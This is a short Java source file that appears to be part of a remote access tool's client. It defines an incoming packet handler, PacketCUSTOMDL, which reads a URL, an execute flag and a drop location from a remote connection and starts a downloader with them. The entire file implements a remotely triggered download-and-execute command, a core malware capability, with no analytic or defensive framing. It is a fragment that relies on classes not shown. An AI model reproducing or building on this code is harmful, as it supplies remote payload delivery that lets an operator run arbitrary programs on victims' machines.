package com.redpois0n.packets.incoming;

import com.redpois0n.AdvDownloader;
import com.redpois0n.Connection;

public class PacketCUSTOMDL extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String url = Connection.readLine();
		boolean exec = Connection.readBoolean();
		String drop = Connection.readLine().toLowerCase();
		new AdvDownloader(url, exec, drop).start();
	}

}
